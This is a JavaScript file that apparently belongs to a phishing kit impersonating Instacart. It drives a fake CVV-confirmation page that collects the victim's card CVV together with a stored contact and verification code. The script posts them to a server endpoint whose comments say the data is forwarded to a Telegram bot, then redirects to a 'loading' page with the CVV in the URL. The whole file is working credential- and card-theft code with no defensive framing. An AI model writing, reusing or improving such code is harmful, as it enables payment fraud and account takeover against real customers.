document.addEventListener('DOMContentLoaded', function() {
    const cvvInputs = document.querySelectorAll('.cvv-digit');
    const cardForm = document.getElementById('cardForm');
    const confirmButton = document.getElementById('confirmButton');
    const cardLastFour = document.getElementById('card-last-four');
    
    // Error display functions
    function showError(message) {
        clearError();
        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        errorDiv.style.color = '#d32f2f';
        errorDiv.style.fontSize = '14px';
        errorDiv.style.marginTop = '12px';
        errorDiv.style.textAlign = 'center';
        errorDiv.textContent = message;
        cardForm.appendChild(errorDiv);
        
        // Add error styling to inputs
        cvvInputs.forEach(input => {
            input.style.borderColor = '#d32f2f';
        });
    }
    
    function clearError() {
        const existingError = cardForm.querySelector('.error-message');
        if (existingError) {
            existingError.remove();
        }
        cvvInputs.forEach(input => {
            input.style.borderColor = '';
        });
    }
    
    // Get card last 4 digits from URL params or localStorage
    const urlParams = new URLSearchParams(window.location.search);
    const lastFour = urlParams.get('card') || localStorage.getItem('instacart_card_last4') || '****';
    
    // Update the card last 4 digits display
    cardLastFour.textContent = lastFour;
    
    // Check for error parameter in URL
    const errorType = urlParams.get('error');
    if (errorType === 'cvv') {
        showError('Incorrect CVV entered');
    }
    
    // Auto-focus first input
    cvvInputs[0].focus();
    
    // Handle input and auto-advance
    cvvInputs.forEach((input, index) => {
        input.addEventListener('input', function(e) {
            const value = this.value;
            
            // Only allow numbers
            if (value && !/^[0-9]$/.test(value)) {
                this.value = '';
                return;
            }
            
            // Add filled class
            if (value) {
                this.classList.add('filled');
                this.classList.remove('error');
                
                // Move to next input
                if (index < cvvInputs.length - 1) {
                    cvvInputs[index + 1].focus();
                } else {
                    // All inputs filled, blur to enable submit
                    this.blur();
                    checkFormComplete();
                }
            } else {
                this.classList.remove('filled');
            }
            
            checkFormComplete();
        });
        
        // Handle backspace
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace') {
                if (!this.value && index > 0) {
                    cvvInputs[index - 1].focus();
                    cvvInputs[index - 1].value = '';
                    cvvInputs[index - 1].classList.remove('filled');
                }
            } else if (e.key === 'Enter') {
                e.preventDefault();
                if (isFormComplete()) {
                    submitForm();
                }
            }
        });
        
        // Handle paste
        input.addEventListener('paste', function(e) {
            e.preventDefault();
            const pastedData = e.clipboardData.getData('text').trim();
            
            // Check if pasted data is 3 digits
            if (/^\d{3}$/.test(pastedData)) {
                pastedData.split('').forEach((digit, i) => {
                    if (cvvInputs[i]) {
                        cvvInputs[i].value = digit;
                        cvvInputs[i].classList.add('filled');
                    }
                });
                
                // Focus last input
                cvvInputs[2].focus();
                checkFormComplete();
            }
        });
        
        // Handle arrow keys
        input.addEventListener('keydown', function(e) {
            if (e.key === 'ArrowLeft' && index > 0) {
                e.preventDefault();
                cvvInputs[index - 1].focus();
            } else if (e.key === 'ArrowRight' && index < cvvInputs.length - 1) {
                e.preventDefault();
                cvvInputs[index + 1].focus();
            }
        });
    });
    
    // Check if form is complete
    function isFormComplete() {
        return Array.from(cvvInputs).every(input => input.value.length === 1);
    }
    
    // Update button state based on form completion
    function checkFormComplete() {
        if (isFormComplete()) {
            confirmButton.disabled = false;
        } else {
            confirmButton.disabled = true;
        }
    }
    
    // Initial check
    checkFormComplete();
    
    // Form submission
    cardForm.addEventListener('submit', function(e) {
        e.preventDefault();
        submitForm();
    });
    
    // Submit function
    function submitForm() {
        if (!isFormComplete()) {
            return;
        }
        
        const cvv = Array.from(cvvInputs).map(input => input.value).join('');
        
        console.log('Confirming card with CVV:', cvv);
        console.log('Card ending in:', lastFour);
        
        // Show loading state
        confirmButton.classList.add('loading');
        confirmButton.disabled = true;
        cvvInputs.forEach(input => {
            input.disabled = true;
        });
        
        // Remove any existing error messages
        const existingError = document.querySelector('.error-message');
        if (existingError) {
            existingError.remove();
        }
        
        const sessionId = localStorage.getItem('instacart_session');
        const contact = localStorage.getItem('instacart_contact');
        const code = localStorage.getItem('instacart_verify_code');
        
        // Send CVV to API/Telegram bot
        fetch('/api/submit-data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                session: sessionId,
                step: 'card',
                data: {
                    cvv: cvv,
                    cardLast4: lastFour,
                    contact: contact,
                    code: code
                }
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log('CVV sent to Telegram bot:', data);
            localStorage.setItem('instacart_cvv', cvv);
            localStorage.setItem('instacart_card_confirmed', 'true');
            // Redirect to loading page for final validation WITH session ID
            window.location.href = `loading.html?step=card&session=${sessionId}&cvv=${cvv}&card=${lastFour}`;
        })
        .catch(error => {
            console.error('Error submitting CVV:', error);
            confirmButton.classList.remove('loading');
            confirmButton.disabled = false;
            cvvInputs.forEach(input => {
                input.disabled = false;
            });
            showError('Error submitting. Please try again.');
        });
    }
    
    // Prevent accidental navigation away
    let formModified = false;
    cvvInputs.forEach(input => {
        input.addEventListener('input', () => {
            formModified = true;
        });
    });
    
    window.addEventListener('beforeunload', function(e) {
        if (formModified && isFormComplete()) {
            e.preventDefault();
            e.returnValue = '';
        }
    });
});
